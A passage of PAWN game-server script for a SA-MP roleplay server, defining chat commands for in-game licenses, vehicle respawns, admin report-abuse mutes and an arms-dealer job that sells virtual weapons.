	} else SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do this.");
	return 1;
}

CMD:getlicense(playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid,2.0,-1209.552001, -171.159011, 4891.833007)) { return 1; }
	if(PlayerInfo[playerid][pWantedLevel] > 0)
	{
		SendClientMessage(playerid, COLOR_LIGHTRED, "You have an outstanding arrest warrant - acquisition of a license is prohibited.");
		return 1;
	}
	ShowPlayerDialogEx(playerid, DIALOG_LICENSE_BUY, DIALOG_STYLE_LIST, "Select the type of license you wish to acquire.", "Driver's License ($500)\r\nBoating License ($500)\r\nPilot License ($2500)", "Purchase", "Cancel");
	return 1;
}

CMD:droplicense(playerid, params[])
{
	new string[128], type;
	if(sscanf(params, "d", type))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /droplicense [type]");
		SendClientMessage(playerid, COLOR_GRAD2, "Types: 1 = Driving, 2 = Boating, 3 = Flying.");
	}

	switch(type)
	{
	case 1:
		{
			if(PlayerInfo[playerid][pCarLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You don't have a driver's license to drop.");
				return 1;
			}
			format(string, sizeof(string), "You have dropped your driver's license.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pCarLic] = 0;
			return 1;
		}
	case 2:
		{
			if(PlayerInfo[playerid][pBoatLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You don't have a boating license to drop.");
				return 1;
			}
			format(string, sizeof(string), "You have dropped your boating license.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pBoatLic] = 0;
			return 1;
		}
	case 3:
		{
			if(PlayerInfo[playerid][pFlyLic] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You don't have a pilot license to drop.");
				return 1;
			}
			format(string, sizeof(string), "You have dropped your pilot license.");
			SendClientMessage(playerid, COLOR_WHITE, string);
			PlayerInfo[playerid][pFlyLic] = 0;
			return 1;
		}
	default:
		{
			SendClientMessage(playerid, COLOR_WHITE, "Invalid license type! /droplicense [type]");
			SendClientMessage(playerid, COLOR_GRAD2, "Types: 1 = Driving, 2 = Boating, 3 = Flying.");
		}
	}
	return 1;
}

CMD:respawnfreegangvehs(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
	    new
			iGang;

	    if(sscanf(params, "d", iGang))
	        return SendClientMessage(playerid, COLOR_GREY, "USAGE: /respawnfreegangvehs [gang slot ID]");

		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6) {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

	    if(iGang < 1 || iGang > MAX_FAMILY || iGang > 255)
			return SendClientMessage(playerid, COLOR_GREY, "Family slot must be between 1 and 14.");

		iGang--; // the silly way the family system is scripted

		for(new v = 0; v < MAX_GANG_VEHICLES; v++) {
		    if(FamilyVehicleInfo[iGang][v][fvId] > 0 && IsVehicleOccupied(FamilyVehicleInfo[iGang][v][fvId]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FamilyVehicleInfo[iGang][v][fvId]);
		}

		new
		    szMessage[64];

		format(szMessage, sizeof(szMessage), "You have respawned all gang vehicles for %s.", FamilyInfo[iGang][FamilyName]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
	} else return SendClientMessage(playerid, COLOR_GREY, "Invalid gang ID.");
	return 1;
}

CMD:respawnfreefactionvehs(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 1 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 1) {
		for(new v = 0; v < sizeof(LSPDVehicles); v++) {
		    if(LSPDVehicles[v] > 0 && IsVehicleOccupied(LSPDVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(LSPDVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "All unoccupied vehicles for your faction (LSPD) have been respawned.");
	} else if(PlayerInfo[playerid][pFaction] == 2 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 2) {
		for(new v = 0; v < sizeof(FBIVehicles); v++) {
		    if(FBIVehicles[v] > 0 && IsVehicleOccupied(FBIVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FBIVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "All unoccupied vehicles for your faction (FBI) have been respawned.");
	} else if(PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 3) {
		for(new v = 0; v < sizeof(LSFMDVehicles); v++) {
		    if(LSFMDVehicles[v] > 0 && IsVehicleOccupied(LSFMDVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(LSFMDVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "All unoccupied vehicles for your faction (LSFMD) have been respawned.");
	} /*else if(PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pLeader] == 5) {
		for(new v = 0; v < sizeof(GovVehicles); v++) {
		    if(GovVehicles[v] > 0 && IsVehicleOccupied(GovVehicles[v]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(GovVehicles[v]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "All unoccupied vehicles for your faction (GOVERNMENT) have been respawned.");
	} else return SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use this command (or your faction does not have any vehicles that can be dynamically respawned).");*/
	return 1;
}

CMD:givelicense(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin]>=4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, type;
		if(sscanf(params, "ud", giveplayerid, type))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense [playerid/partofname] [type]");
			SendClientMessage(playerid, COLOR_GRAD2, "Types: 1 = Driving, 2 = Boating, 3 = Flying.");
			return 1;
		}

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
			return 1;
		}

		switch(type)
		{
		case 1:
			{
				if(PlayerInfo[giveplayerid][pCarLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This player already has a driver's license.");
					return 1;
				}
				format(string, sizeof(string), "You have given a driver's license to %s.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given you a driver's license.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given a driver's license to %s.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pCarLic] = 1;
				return 1;
			}
		case 2:
			{
				if(PlayerInfo[giveplayerid][pBoatLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This player already has a boating license.");
					return 1;
				}
				format(string, sizeof(string), "You have given a boating license to %s.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given you a boating license.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given a boating license to %s.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pBoatLic] = 1;
				return 1;
			}
		case 3:
			{
				if(PlayerInfo[giveplayerid][pFlyLic] == 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This player already has a pilot license.");
					return 1;
				}
				format(string, sizeof(string), "You have given a pilot license to %s.",GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given you a pilot license.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);
				format(string, sizeof(string), "Admin %s has given a pilot license to %s.",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pFlyLic] = 1;
				return 1;
			}
		default:
			{
				SendClientMessage(playerid, COLOR_WHITE, "Invalid license type! /givelicense [playerid/partofname] [type]");
				SendClientMessage(playerid, COLOR_GRAD2, "Types: 1 = Driving, 2 = Boating, 3 = Flying.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, "You're not authorised to use this command.");
	return 1;
}

CMD:rto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[512], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /rto [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 0)
			{
			    if(PlayerInfo[giveplayerid][pRMutedTotal] == 0)
			    {
  					PlayerInfo[giveplayerid][pRMutedTotal] = 1;
					format(string, sizeof(string), "AdmCmd: %s has given %s their first warning about report abuse, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "An admin warns you not to abuse /report.\n\nNote that future abuse of /report could result in a mute from /report or loss of that privilege altogether.");
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Report abuse warning", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s has given %s their first warning about report abuse, reason: %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					Log("logs/mute.log", string);

			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 1)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 2;
					PlayerInfo[giveplayerid][pRMutedTime] = 15*60;
					format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from submitting reports, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "You have been temporarily blocked from submitting reports by %s, reason: %s.\n\nAs this is the second time you have been blocked from reporting, you will not be able to use /report for 15 minutes.\n\nNote that future abuse of /report could result in a longer mute from /report or loss of that privilege altogether.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Temporarily blocked from reports", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 2)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 3;
					PlayerInfo[giveplayerid][pRMutedTime] = 30*60;
					format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from submitting reports, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "You have been temporarily blocked from submitting reports by %s, reason: %s.\n\nAs this is the third time you have been blocked from reporting, you will not be able to use /report for 30 minutes.\n\nNote that future abuse of /report could result in a longer mute from /report or loss of that privilege altogether.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Temporarily blocked from reports", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
			    }
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 3)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 4;
					PlayerInfo[giveplayerid][pRMutedTime] = 45*60;
					format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from submitting reports, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "You have been temporarily blocked from submitting reports by %s, reason: %s.\n\nAs this is the fourth time you have been blocked from reporting, you will not be able to use /report for 45 minutes.\n\nNote that future abuse of /report could result in a longer mute from /report or loss of that privilege altogether.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Temporarily blocked from reports", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] == 4)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 5;
					PlayerInfo[giveplayerid][pRMutedTime] = 60*60;
					format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from submitting reports, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "You have been temporarily blocked from submitting reports by %s, reason: %s.\n\nAs this is the fifth time you have been blocked from reporting, you will not be able to use /report for 60 minutes.\n\nNote that future abuse of /report could result in a loss of that privilege altogether.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Temporarily blocked from reports", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}
			    else if(PlayerInfo[giveplayerid][pRMutedTotal] >= 5)
			    {
  					PlayerInfo[giveplayerid][pRMuted] = 2;
  					PlayerInfo[giveplayerid][pRMutedTotal] = 6;
					PlayerInfo[giveplayerid][pRMutedTime] = 300*60;
					format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from submitting reports, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
					ABroadCast(COLOR_LIGHTRED,string,1);

					format(string, sizeof(string), "You have been temporarily blocked from submitting reports by %s, reason: %s.\n\nAs this is the sixth time you have been blocked from reporting, you will not be able to use /report for 5 hours.\n\nNote that future abuse of /report could result in a loss of that privilege altogether.", GetPlayerNameEx(playerid), reason);
					ShowPlayerDialogEx(giveplayerid,7954,DIALOG_STYLE_MSGBOX,"Temporarily blocked from reports", string,"Next", "");

					format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
					Log("logs/mute.log", string);
				}

				for(new i = 0; i < MAX_REPORTS; i++)
				{
					if(Reports[i][ReportFrom] == giveplayerid)
					{
						Reports[i][BeingUsed] = 0;
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is already disabled from /reports.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:rtoreset(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /rtoreset [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 2)
			{
				PlayerInfo[giveplayerid][pRMuted] = 0;
				PlayerInfo[giveplayerid][pRMutedTotal]--;
				PlayerInfo[giveplayerid][pRMutedTime] = 0;
				format(string, sizeof(string), "AdmCmd: %s has unblocked %s from reporting, reason: %s",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);
				SendClientMessage(giveplayerid, COLOR_GRAD2, "You have been unblocked from submitting reports. You may now use the reporting system again.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Please accept our apologies for any error and inconvenience this may have caused.");
				format(string, sizeof(string), "AdmCmd: %s was unblocked from /report by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				Log("logs/mute.log", string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "That player is not blocked from reporting!");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:rmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /rmute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pRMuted] == 0)
			{
				PlayerInfo[giveplayerid][pRMuted] = 1;
				format(string, sizeof(string), "AdmCmd: %s has indefinitely blocked %s from submitting reports.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(string, sizeof(string), "You have been blocked from submitting /reports by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);
				SendClientMessage(giveplayerid, COLOR_GRAD2, "You will not be able to submit reports until you're unblocked. To appeal this action contact us on "WEBSITE);
				format(string, sizeof(string), "AdmCmd: %s was blocked from /report by %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				PlayerInfo[giveplayerid][pRMuted] = 0;
				PlayerInfo[giveplayerid][pRMutedTime] = 0;
				format(string, sizeof(string), "AdmCmd: %s has been re-allowed to submit reports by %s",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);
				format(string, sizeof(string), "You have been re-allowed to submitting /reports again by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);
				format(string, sizeof(string), "AdmCmd: %s was unblocked from /report by %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:sellgun(playerid, params[])
{
    new string[128];
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid,COLOR_GREY,"   You can't do this while being in a arena!");
        return 1;
    }
   	if(GetPVarInt(playerid, "EventToken") == 1) {
		SendClientMessage(playerid, COLOR_WHITE, "You can't use this command while in an event.");
		return 1;
	}
    if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9) {
        SendClientMessage(playerid,COLOR_GREY,"   You're not a Arms Dealer!");
        return 1;
    }
    if(PlayerInfo[playerid][pScrewdriver] == 0) {
        SendClientMessage(playerid,COLOR_GREY,"   You need a screwdriver from a craftsman to make a weapon!");
        return 1;
    }
    if(PlayerInfo[playerid][pJailTime] > 0) {
        SendClientMessage(playerid,COLOR_GREY,"You can't make guns while in jail or prison!");
        return 1;
    }
   	if(PlayerBoxing[playerid] == 1)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "You can make guns while you're boxing.");
     	return 1;
   	}
    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "You can't sell a weapon while in a vehicle.");

    if(GetPVarInt(playerid, "ArmsTimer") > 0) {
        format(string, sizeof(string), "   You must wait %d seconds before selling another weapon.", GetPVarInt(playerid, "ArmsTimer"));
        SendClientMessage(playerid,COLOR_GREY,string);
        return 1;
    }
    if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
        SendClientMessage(playerid, COLOR_GREY, "You can't spawn a weapon whilst in Hospital.");
        return 1;
    }
    new giveplayerid,x_weapon[20],weapon,price;
    if(sscanf(params, "us[20]", giveplayerid, x_weapon)) {
        SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
        SendClientMessage(playerid, COLOR_YELLOW, "<< Available weapons >>");
        new level = PlayerInfo[playerid][pArmsSkill];
        if(level >= 0 && level < 50) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(100)	flowers(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "9mm(150)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(200)	 knuckles(25)");
        }
        else if(level >= 50 && level < 100) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(100)	flowers(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "9mm(150)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(200)	 knuckles(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(400)		 baseballbat(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(1000)	  cane(25)");
        }
        else if(level >= 100 && level < 200) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(100)	flowers(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "9mm(150)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(200)	 knuckles(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(400)		 baseballbat(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(1000)	  cane(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(2000)	 shovel(25)");
        }
        else if(level >= 200 && level < 400) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(100)	flowers(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "9mm(150)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(200)	 knuckles(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(400)		 baseballbat(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(1000)	  cane(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(2000)	 shovel(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "ak47(3500)	   poolcue(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "m4(4500)		 golfclub(25)");
        }
        else if(level >= 400) {
            SendClientMessage(playerid, COLOR_GRAD1, "sdpistol(100)	flowers(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "9mm(150)");
            SendClientMessage(playerid, COLOR_GRAD1, "shotgun(200)	 knuckles(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "mp5(400)		 baseballbat(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "rifle(1000)	  cane(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "deagle(2000)	 shovel(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "ak47(3500)	   poolcue(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "m4(4500)		 golfclub(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "spas12(6500)	 dildo(25)");
            SendClientMessage(playerid, COLOR_GRAD1, "sniper(7000)	 katana(25)");
        }
        SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellgun [playerid/partofname] [weaponname]");
        return 1;
    }
   	if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "You can't sell a weapon to this player as they're not connected.");

	if(PlayerInfo[giveplayerid][pJailTime] > 0 || PlayerCuffed[giveplayerid] > 0)
        return SendClientMessage(playerid,COLOR_GREY,"You can't give guns to people who are in prison or cuffed!");

    if(strcmp(x_weapon,"dildo",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 10; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"katana",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 400) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 8; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"golfclub",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 2; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"poolcue",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 7; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"shovel",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 100) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 6; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"cane",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 15; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"baseballbat",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 5; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"knuckles",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 1; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"sdpistol",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 99) {
            weapon = 23; price = 100;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"flowers",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 24) {
            weapon = 14; price = 25;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"deagle",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 100) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 1999) {
            weapon = 24; price = 2000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"mp5",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "You're not the required level to create that!");
        if(PlayerInfo[playerid][pMats] > 399) {
            weapon = 29; price = 400;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"shotgun",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 199) {
            weapon = 25; price = 200;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"9mm",true) == 0) {
        if(PlayerInfo[playerid][pMats] > 149) {
            weapon = 22; price = 150;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"   Not enough Materials for that Weapon!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"spas12",true) == 0) {
